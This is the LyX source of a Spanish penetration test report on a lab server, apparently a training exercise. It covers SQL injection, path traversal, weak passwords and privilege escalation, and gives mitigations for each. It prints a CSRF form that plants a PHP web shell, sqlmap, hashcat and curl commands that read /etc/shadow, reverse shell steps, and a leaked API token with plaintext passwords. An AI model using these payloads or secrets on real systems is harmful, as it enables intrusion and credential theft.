#LyX 2.3 created this file. For more info see http://www.lyx.org/
\lyxformat 544
\begin_document
\begin_header
\save_transient_properties true
\origin unavailable
\textclass ../../../../classicthesis/classicthesis
\begin_preamble
\setlength{\parskip}{2mm}
\end_preamble
\options most,dvipsnames,chapter,listings=false,headinclude=true
\use_default_options false
\begin_modules
tcolorbox
customHeadersFooters
\end_modules
\maintain_unincluded_children false
\language spanish
\language_package default
\inputencoding auto
\fontencoding global
\font_roman "default" "default"
\font_sans "default" "default"
\font_typewriter "default" "default"
\font_math "auto" "auto"
\font_default_family default
\use_non_tex_fonts false
\font_sc false
\font_osf false
\font_sf_scale 100 100
\font_tt_scale 100 100
\use_microtype false
\use_dash_ligatures true
\graphics default
\default_output_format default
\output_sync 0
\bibtex_command default
\index_command default
\paperfontsize default
\spacing single
\use_hyperref false
\papersize default
\use_geometry false
\use_package amsmath 1
\use_package amssymb 1
\use_package cancel 1
\use_package esint 1
\use_package mathdots 1
\use_package mathtools 1
\use_package mhchem 1
\use_package stackrel 1
\use_package stmaryrd 1
\use_package undertilde 1
\cite_engine basic
\cite_engine_type default
\biblio_style plain
\use_bibtopic false
\use_indices false
\paperorientation portrait
\suppress_date false
\justification true
\use_refstyle 1
\use_minted 1
\index Index
\shortcut idx
\color #008000
\end_index
\secnumdepth 3
\tocdepth 3
\paragraph_separation indent
\paragraph_indentation default
\is_math_indent 0
\math_numbering_side default
\quotes_style french
\dynamic_quotes 0
\papercolumns 1
\papersides 1
\paperpagestyle default
\tracking_changes false
\output_changes false
\html_math_output 0
\html_css_as_file 0
\html_be_strict false
\end_header

\begin_body

\begin_layout New Color Box Type
\begin_inset Argument 2
status open

\begin_layout Plain Layout

cBoxA
\end_layout

\end_inset

 title=Informaci
\backslash
'on, drop shadow, enhanced, colbacktitle=Green, colback=YellowGreen
\end_layout

\begin_layout New Color Box Type
\begin_inset Argument 2
status open

\begin_layout Plain Layout

cBoxB
\end_layout

\end_inset

 title=Vulnerabilidad Alta, drop shadow, enhanced, colbacktitle=Red, colback=Ora
nge
\end_layout

\begin_layout New Color Box Type
\begin_inset Argument 2
status open

\begin_layout Plain Layout

cBoxC
\end_layout

\end_inset

 title=Vulnerabilidad Media, drop shadow, enhanced, colbacktitle=Dandelion,
 colback=Goldenrod, coltitle=Black
\end_layout

\begin_layout New Color Box Type
\begin_inset Argument 2
status open

\begin_layout Plain Layout

cBoxD
\end_layout

\end_inset

 title=Vulnerabilidad Baja, drop shadow, enhanced, colbacktitle=Green, colback=Y
ellowGreen
\end_layout

\begin_layout Standard
\begin_inset VSpace vfill*
\end_inset


\end_layout

\begin_layout Standard
\align center
\begin_inset Flex CT - Spaced All Caps
status open

\begin_layout Plain Layout
Test de Intrusión
\end_layout

\end_inset

: NSA
\end_layout

\begin_layout Standard
\begin_inset VSpace vfill*
\end_inset


\end_layout

\begin_layout Standard
\align center
\begin_inset Graphics
	filename logo.jpg
	scale 30
	BoundingBox 200bp 350bp 800bp 800bp
	clip

\end_inset


\end_layout

\begin_layout Standard
\begin_inset VSpace vfill*
\end_inset


\end_layout

\begin_layout Standard
\align center
\begin_inset Flex CT - Spaced Low Small Caps
status open

\begin_layout Plain Layout
Federico Juan Badaloni.
 Damián Ariel Marotte.
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset VSpace vfill*
\end_inset


\end_layout

\begin_layout Standard
\begin_inset CommandInset toc
LatexCommand tableofcontents

\end_inset


\end_layout

\begin_layout Part Introduction (ClassicThesis)
\begin_inset VSpace bigskip*
\end_inset


\emph on
El riesgo de un ataque informático a la NSA es severo y puede derivar en
 perdidas totales.
\emph default

\begin_inset VSpace bigskip*
\end_inset


\end_layout

\begin_layout Part
Introducción
\end_layout

\begin_layout Chapter
Resumen ejecutivo
\end_layout

\begin_layout Standard
El presente informe tiene por objetivo detallar los problemas de seguridad
 encontrados durante el test de intrusión realizado a la agencia de seguridad
 de los estados unidos.
\end_layout

\begin_layout Standard
Como resultado de los test realizados se han encontrado los siguientes tipos
 de vulnerabilidades:
\end_layout

\begin_layout Itemize
XSS.
\end_layout

\begin_layout Itemize
Contraseñas débiles.
\end_layout

\begin_layout Itemize
CSRF.
\end_layout

\begin_layout Itemize
Path traversal.
\end_layout

\begin_layout Itemize
Inyecciones SQL.
\end_layout

\begin_layout Itemize
Local File Inclusion.
\end_layout

\begin_layout Itemize
Unrestricted file upload.
\end_layout

\begin_layout Itemize
Escalada de privilegios.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 2
status open

\begin_layout Plain Layout
Como consecuencia de dichas vulnerabilidades el sistema puede quedar completamen
te expuesto a ataques.
 Mas aún, un terrorista podría obtener credenciales que le permitan obtener
 suficiente información como para realizar un atentado contra el presidente.
\end_layout

\end_inset


\end_layout

\begin_layout Chapter
Enumeración de tecnologías
\end_layout

\begin_layout Section
Sistema Operativo
\end_layout

\begin_layout Standard
El servidor se encuentra corriendo el sistema operativo 
\emph on
Ubuntu
\emph default
 10.04.3, utilizando el kernel de Linux en su versión 3.19.
\end_layout

\begin_layout Standard
Se encuentran además instaladas las siguientes aplicaciones: 
\end_layout

\begin_layout Itemize

\emph on
Apache
\emph default
 2.4.7
\end_layout

\begin_layout Itemize

\emph on
PHP
\emph default
 5.5.9
\end_layout

\begin_layout Itemize

\emph on
MySQL
\emph default
 5.6.27
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 1
status open

\begin_layout Plain Layout
Puede obtener información sobre su sistema con los comandos:
\end_layout

\begin_layout Itemize

\family typewriter
uname -a
\end_layout

\begin_layout Itemize

\family typewriter
apache2 -v
\end_layout

\begin_layout Itemize

\family typewriter
php -v
\end_layout

\begin_layout Itemize

\family typewriter
mysqld –-version
\end_layout

\end_inset


\end_layout

\begin_layout Section
Aplicaciones Web
\end_layout

\begin_layout Standard
En dicho servidor se encuentran corriendo las siguientes aplicaciones web:
\end_layout

\begin_layout Standard
\begin_inset Float table
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Tabular
<lyxtabular version="3" rows="4" columns="3">
<features tabularvalignment="middle">
<column alignment="center" valignment="top">
<column alignment="center" valignment="top">
<column alignment="center" valignment="top">
<row>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Aplicación
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Versión
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Ruta
\end_layout

\end_inset
</cell>
</row>
<row>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Pligg
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
2.0.2
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
/pligg/
\end_layout

\end_inset
</cell>
</row>
<row>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Wordpress
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
4.3.24
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
/nasa/
\end_layout

\end_inset
</cell>
</row>
<row>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Ajax File Manager
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
1.0.1
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
/important/
\end_layout

\end_inset
</cell>
</row>
</lyxtabular>

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
Aplicaciones web
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Section
Puertos abiertos
\end_layout

\begin_layout Standard
La siguiente tabla da cuenta de los puertos abiertos que tiene la máquina:
\end_layout

\begin_layout Standard
\begin_inset Float table
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Tabular
<lyxtabular version="3" rows="5" columns="4">
<features tabularvalignment="middle">
<column alignment="center" valignment="top">
<column alignment="center" valignment="top">
<column alignment="center" valignment="top">
<column alignment="center" valignment="top">
<row>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Puerto
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Protocolo
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Servicio
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Versión
\end_layout

\end_inset
</cell>
</row>
<row>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
21
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
tcp
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
ftp
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
vsftpd 3.0.2
\end_layout

\end_inset
</cell>
</row>
<row>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
22
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
tcp
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
ssh
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
OpenSSH 6.6.1p1
\end_layout

\end_inset
</cell>
</row>
<row>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
80
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
tcp
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
http
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Apache httpd 2.4.7
\end_layout

\end_inset
</cell>
</row>
<row>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
8000
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
tcp
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
http-alt
\end_layout

\end_inset
</cell>
<cell alignment="center" valignment="top" topline="true" bottomline="true" leftline="true" rightline="true" usebox="none">
\begin_inset Text

\begin_layout Plain Layout
Apache httpd 2.4.7
\end_layout

\end_inset
</cell>
</row>
</lyxtabular>

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
Puertos abiertos
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 1
status open

\begin_layout Plain Layout
Un puerto abierto no es necesariamente una vulnerabilidad.
 No obstante deben observarse con cautela pues representan una puerta de
 entrada al sistema.
\end_layout

\begin_layout Plain Layout
Puede escanear sus puertos abierto con el comando:
\end_layout

\begin_layout Plain Layout
\begin_inset listings
lstparams "language=bash"
inline false
status open

\begin_layout Plain Layout

nmap -sV ip
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Part Introduction (ClassicThesis)
\begin_inset VSpace bigskip*
\end_inset


\emph on
La utilización de software desactualizado genera problemas en todas sus
 aplicaciones.
\emph default

\begin_inset VSpace bigskip*
\end_inset


\end_layout

\begin_layout Part
Vulnerabilidades
\end_layout

\begin_layout Chapter
Sistema Operativo
\end_layout

\begin_layout Section
Escalada de privilegios
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
La versión del kernel que corre el servidor presenta una vulnerabilidad
 importante.
 Esta permite a un usuario común con acceso (remoto o local) al sistema,
 obtener credenciales de administrador.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 2
status open

\begin_layout Plain Layout
Un atacante puede aprovechar esta vulnerabilidad para obtener cualquier
 información no solo de sus servicios web, sino de todo el sistema.
 Además también puede eliminar dicha información, dejando el sistema inutilizabl
e.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
Se recomienda actualizar el sistema operativo lo antes posible, de lo contrario
 pueden llegar a sufrirse perdidas totales.
\end_layout

\begin_layout Subsection
Prueba de concepto
\end_layout

\begin_layout Standard
El código para explotar esta vulnerabilidad puede observarse en 
\begin_inset CommandInset href
LatexCommand href
target "https://www.exploit-db.com/exploits/37292"

\end_inset

.
 Basta compilar dicho programa y ejecutarlo para acceder al usuario 
\family typewriter
root
\family default
.
\end_layout

\begin_layout Standard
Como prueba de la posible explotación se exhibe la siguiente bandera encontrada
 en la carpeta personal del usuario 
\family typewriter
root
\family default
:
\end_layout

\begin_layout Standard
\begin_inset listings
inline false
status open

\begin_layout Plain Layout

7091996b0ccbb6c6145dca439f44cbe3c6c757e476241d1cc64ec3dcf0f722fb
\end_layout

\end_inset


\end_layout

\begin_layout Section
Contraseñas débiles
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Itemize
El usuario 
\family typewriter
michelle
\family default
 tiene como contraseña 
\family typewriter

\begin_inset Quotes fld
\end_inset

michelle1992
\family default

\begin_inset Quotes frd
\end_inset

.
 Esta contraseña es muy débil y puede ser fácilmente recuperada por un atacante.
\end_layout

\begin_layout Itemize
El usuario 
\family typewriter
obama
\family default
 tiene como contraseña 
\family typewriter

\begin_inset Quotes fld
\end_inset

obamaobamaobama
\family default

\begin_inset Quotes frd
\end_inset

.
 Aunque esta contraseña sea ligeramente mas apropiada, el hecho de que es
 reutilizada en otras aplicaciones la vuelven vulnerable.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 3
status open

\begin_layout Plain Layout
Si bien es cierto que los usuarios no tienen privilegios importantes dentro
 del sistema, la combinación de esta debilidad junto con la vulnerabilidad
 anterior permiten a un hacker acceder al sistema sin restricciones.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
Se recomienda implementar una política de contraseñas mucho mas segura y
 solicitar a todos los usuarios del sistema que cambien sus claves de acceso.
\end_layout

\begin_layout Subsection
Prueba de concepto
\end_layout

\begin_layout Standard
En el archivo 
\family typewriter
/etc/shadow-
\family default
 pueden verse las contraseñas encriptadas de cada usuario.
 Un hacker podría utilizar los siguientes comandos para recuperar la contraseña
 del usuario 
\family typewriter
michelle
\family default
 en poco tiempo:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=bash,fontsize={\small}"
inline false
status open

\begin_layout Plain Layout

echo -n 
\backslash

\end_layout

\begin_layout Plain Layout

$6$PxviCoLU$mCZ920AxWdCz8PORTR.Q.azdXDuutw9B1H7k31palCqPcpTVQk1n5hBSDX6w5mncFgzMBm
nIIC 
\backslash

\end_layout

\begin_layout Plain Layout

> hash.txt
\end_layout

\begin_layout Plain Layout

hashcat -m 1800 -O -w 3 hash.txt /usr/share/wordlists/rockyou.txt
\end_layout

\end_inset


\end_layout

\begin_layout Chapter
Pligg
\end_layout

\begin_layout Section
Path traversal, CSRF y Unrestricted file upload
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
A través del editor de plantillas de 
\emph on
Pligg
\emph default
, un usuario administrador puede leer y escribir archivos como se puede
 ver en 
\begin_inset CommandInset href
LatexCommand href
target "https://www.exploit-db.com/exploits/38579"

\end_inset

.
 Además también pueden recorrerse rutas fuera del servidor web.
\end_layout

\begin_layout Standard
Aún sin ser administrador, el atacante podría enviar un vinculo malicioso
 al administrador que de ser abierto, permitirá explotar la vulnerabilidad.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 2
status open

\begin_layout Plain Layout
Esta vulnerabilidad permite subir código 
\emph on
PHP
\emph default
 con el cual pueden leerse código fuente de las aplicaciones para obtener
 los nombres de las bases de datos, sus usuarios y sus contraseñas.
\end_layout

\begin_layout Plain Layout
Además como se verá mas adelante, también permite al atacante habilitar
 una consola de comandos para futuros ataques.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
Aunque puede solucionarse el problema aplicando los controles y sanitizaciones
 correspondientes, la aplicación web se encuentra fuera de desarrollo y
 completamente desactualizada, por lo que la recomendación es dejar de utilizar
 
\emph on
Pligg
\emph default
.
\end_layout

\begin_layout Subsection
Prueba de concepto
\end_layout

\begin_layout Standard
El siguiente fragmento de código 
\emph on
HTML
\emph default
 escribe un archivo en el servidor, que puede ser utilizado un hacker para
 ejecución de código remoto:
\begin_inset Newpage pagebreak
\end_inset


\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=HTML,fontsize={\small}"
inline false
status open

\begin_layout Plain Layout

<form action="http://192.168.0.19/pligg/admin/admin_editor.php" method="post">
\end_layout

\begin_layout Plain Layout

    <input type="hidden" name="the_file2" value="../templates/exploit.php"/>
\end_layout

\begin_layout Plain Layout

    <input type="hidden" name="updatedfile" value="<?php passthru($_GET['x']);
 ?>"/>
\end_layout

\begin_layout Plain Layout

    <input type="hidden" name="isempty" value="1"/>
\end_layout

\begin_layout Plain Layout

    <input type="hidden" name="save" value="Save+Changes"/>
\end_layout

\begin_layout Plain Layout

</form>
\end_layout

\begin_layout Plain Layout

<script>document.forms[0].submit();</script>
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Luego el atacante puede acceder a 
\begin_inset CommandInset href
LatexCommand href
target "http://192.168.0.19/pligg/templates/exploit.php?x=cat ../libs/dbconnect.php"
literal "false"

\end_inset

 y leer el código fuente de la página resultante para observar la salida
 de la ejecución.
\end_layout

\begin_layout Section
Inyección SQL
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
El parámetro 
\family typewriter
sql
\family default
 de la página 
\family typewriter
load_data_for_search.php
\family default
 es vulnerable a inyecciones de código SQL tal como puede leerse en 
\begin_inset CommandInset href
LatexCommand href
target "https://www.exploit-db.com/exploits/38241"

\end_inset

.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 2
status open

\begin_layout Plain Layout
Un atacante experimentado puede aprovecharse de esta vulnerabilidad para
 recuperar la base de datos completa del sitio web y con ello lograr acceder
 al panel de administrador de 
\emph on
Pligg
\emph default
.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
Aunque puede solucionarse el problema aplicando los controles y sanitizaciones
 correspondientes, la aplicación web se encuentra fuera de desarrollo y
 completamente desactualizada, por lo que la recomendación es dejar de utilizar
 
\emph on
Pligg
\emph default
.
\end_layout

\begin_layout Subsection
Prueba de concepto
\end_layout

\begin_layout Standard
Para recuperar la información de la base de datos se puede utilizar el comando:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=bash"
inline false
status open

\begin_layout Plain Layout

sqlmap -u 192.168.0.19/pligg/load_data_for_search.php?sql= 
\backslash

\end_layout

\begin_layout Plain Layout

-o --dump --batch --level=5
\end_layout

\end_inset


\end_layout

\begin_layout Section
Contraseña débil
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
La contraseña del usuario 
\family typewriter
barack
\family default
 es 
\begin_inset Quotes fld
\end_inset


\family typewriter
obamaobamaobama
\family default

\begin_inset Quotes frd
\end_inset

.
 Esta contraseña es lo suficientemente débil como para que un hacker pueda
 obtenerla.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 3
status open

\begin_layout Plain Layout
Idealmente esto solamente implica que un atacante puede acceder al panel
 de administración de la aplicación web, sin embargo la misma contraseña
 es reutilizada en otras partes del sistema.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
Se recomienda implementar una política de contraseñas mucho mas segura y
 solicitar a todos los usuarios del sistema que cambien sus claves de acceso.
\end_layout

\begin_layout Subsection
Prueba de concepto
\end_layout

\begin_layout Standard
Tal como se detalla en 
\begin_inset CommandInset href
LatexCommand href
target "https://www.exploit-db.com/exploits/17077"

\end_inset

 si se obtiene la información de la base de datos se puede recuperar la
 contraseña del usuario 
\family typewriter
barack
\family default
 utilizando el programa 
\family typewriter
hashcat
\family default
:
\end_layout

\begin_layout Standard
\begin_inset listings
inline false
status open

\begin_layout Plain Layout

echo -n 4c2383ac91e67505741b9cdad3b9bee87e62ba98:1bf490bb3 > hash.txt
\end_layout

\begin_layout Plain Layout

hashcat -m 120 -O -w 3 hash.txt /usr/share/wordlist/rockyou.txt 
\backslash

\end_layout

\begin_layout Plain Layout

-r rules
\backslash
d3ad0ne.rule
\end_layout

\end_inset


\end_layout

\begin_layout Section
XSS
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
Tal como se explica en 
\begin_inset CommandInset href
LatexCommand href
target "https://packetstormsecurity.com/files/131601/Pligg-CMS-2.0.2-Cross-Site-Scripting.html"

\end_inset

 un usuario administrador puede crear una página con contenido 
\emph on
JavaScript
\emph default
 que podría lograr por ejemplo, obtener una copia de las pulsaciones del
 teclado de su victima.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 4
status open

\begin_layout Plain Layout
Esta vulnerabilidad no representa una amenaza directa sobre el sitio web,
 pero el administrador podría aprovechar sus privilegios para robar información
 sobre el resto de los usuarios
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
Aunque puede solucionarse el problema aplicando los controles y sanitizaciones
 correspondientes, la aplicación web se encuentra fuera de desarrollo y
 completamente desactualizada, por lo que la recomendación es dejar de utilizar
 
\emph on
Pligg
\emph default
.
\end_layout

\begin_layout Chapter
Wordpress
\end_layout

\begin_layout Section
Local File Inclusion & Path Traversal
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
El plug-in 
\emph on
SE HTML Album Audio Player
\emph default
 instalado en 
\emph on
Wordpress
\emph default
 permite a un atacante leer archivos en cualquier parte del sistema, tal
 como se describe en 
\emph on

\begin_inset CommandInset href
LatexCommand href
target "https://wpscan.com/vulnerability/8032"

\end_inset


\emph default
.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 2
status open

\begin_layout Plain Layout
Un hacker puede aprovechar este defecto para obtener información vital del
 sistema como usuarios, contraseñas y código fuente; entre otras cosas.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
Para solucionar el inconveniente se debe desinstalar dicho plug-in y reemplazarl
o por otro que se encuentre actualizado.
\end_layout

\begin_layout Subsection
Prueba de concepto
\end_layout

\begin_layout Standard
El siguiente comando de Linux permite leer archivos en el servidor:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=bash,fontsize={\footnotesize}"
inline false
status open

\begin_layout Plain Layout

curl 
\backslash

\end_layout

\begin_layout Plain Layout

http://192.168.0.19/nasa/wp-content/plugins/se-html5-album-audio-player/download_au
dio.php? 
\backslash

\end_layout

\begin_layout Plain Layout

file=/nasa/wp-content/uploads/../../../../../../etc/shadow-
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 1
status open

\begin_layout Plain Layout
Puede verificar información sobre su instalación de 
\emph on
Wordpress
\emph default
 utilizando el siguiente comando:
\end_layout

\begin_layout Plain Layout
\begin_inset listings
lstparams "language=TeX,fontsize={\small}"
inline false
status open

\begin_layout Plain Layout

wpscan --url 192.168.0.19/nasa --enumerate 
\backslash

\end_layout

\begin_layout Plain Layout

--api-token OzMAIX0hemNhPZcasfrBhsiNuV7tsES2usqk53w5Ml0 
\backslash

\end_layout

\begin_layout Plain Layout

--proxy http://127.0.0.1:8080 --disable-tls-checks
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
Tenga en cuenta que probablemente necesite configurar un proxy para redirigir
 el trafico de 172.18.1.68 hasta la ip del servidor.
 Además también necesitará un token provisto por 
\begin_inset CommandInset href
LatexCommand href
target "https://wpscan.com/api"

\end_inset

.
\end_layout

\end_inset


\end_layout

\begin_layout Chapter
Ajax File Manager
\end_layout

\begin_layout Section
Listado de archivos & Path traversal
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
Puede utilizarse una vulnerabilidad en el archivo 
\family typewriter
ajax_get_file_listing.php
\family default
 para realizar un listado de archivos en el sistema.
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 4
status open

\begin_layout Plain Layout
Si bien esta vulnerabilidad solo permite listar archivos, esta información
 puede ser utilizada por el atacante para obtener detalles sobre el sistema.
 En combinación con Local File Incluision puede aumentar su gravedad.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
La aplicación se encuentra fuera de desarrollo hace mas de 8 años, por lo
 que se recomienda dejar de utilizarla.
\end_layout

\begin_layout Subsection
Prueba de concepto
\end_layout

\begin_layout Standard
Con el siguiente vinculo puede obtenerse el listado de archivos de casi
 cualquier directorio del sistema:
\end_layout

\begin_layout Standard
\begin_inset CommandInset href
LatexCommand href
target "http://192.168.0.19/important/ajaxfilemanager/ajax_get_file_listing.php?limit=1000&view=thumbnail&search=1&search_name=&search_recursively=0&search_mtime_from=&search_mtime_to=&search_folder=../../nasa"

\end_inset


\end_layout

\begin_layout Section
Contraseña por defecto
\end_layout

\begin_layout Subsection
Descripción
\end_layout

\begin_layout Standard
La aplicación preserva su nombre de usuario (
\family typewriter
ajax
\family default
) y contraseña por defecto (
\family typewriter

\begin_inset Quotes fld
\end_inset

123456
\family default

\begin_inset Quotes frd
\end_inset

).
\end_layout

\begin_layout Standard
\begin_inset Flex Custom Color Box 3
status open

\begin_layout Plain Layout
Aunque no hemos sido capaces de hacer funcionar la aplicación, probablemente
 existan vulnerabilidades que permitan subir archivos que logren ejecución
 de código remoto.
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Mitigación
\end_layout

\begin_layout Standard
La aplicación se encuentra fuera de desarrollo hace mas de 8 años, por lo
 que se recomienda dejar de utilizarla.
\end_layout

\begin_layout Part Introduction (ClassicThesis)
\begin_inset VSpace bigskip*
\end_inset


\emph on
Un atacante no solo podrá utilizar las vulnerabilidades para recuperar informaci
ón acerca de su sistema, sino que además puede instalar troyanos para asegurarse
 una puerta de acceso en caso de que los problemas sean corregidos.
 
\emph default

\begin_inset VSpace bigskip*
\end_inset


\end_layout

\begin_layout Part
Mantenimiento
\end_layout

\begin_layout Chapter
Reverse Shell
\end_layout

\begin_layout Standard
El siguiente mecanismo puede utilizarse para obtener una terminal de comandos
 con privilegios de administrador:
\end_layout

\begin_layout Enumerate
Aprovechando la vulnerabilidad de inyección SQL en 
\emph on
Pligg
\emph default
 puede obtenerse la contraseña encriptada del administrador de la aplicación.
\end_layout

\begin_layout Enumerate
Como su contraseña es debil, resulta fácil desencriptarla y acceder al panel
 de administración.
\end_layout

\begin_layout Enumerate
Utilizando el editor de templates de la aplicación web, se puede subir el
 siguiente script en PHP: 
\begin_inset CommandInset href
LatexCommand href
target "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"

\end_inset

.
\end_layout

\begin_layout Enumerate
A continuación en la máquina del atacante se ejecuta el comando 
\begin_inset listings
lstparams "language=bash"
inline true
status open

\begin_layout Plain Layout

nc -v -n -l -p 1234
\end_layout

\end_inset

.
\end_layout

\begin_layout Enumerate
Luego se debe acceder a través del navegador a la ruta en donde se subió
 previamente el código malicioso.
\end_layout

\begin_layout Enumerate
Finalmente se puede aprovechar la escalada de privilegios para obtener acceso
 al usuario 
\family typewriter
root
\family default
.
\end_layout

\end_body
\end_document
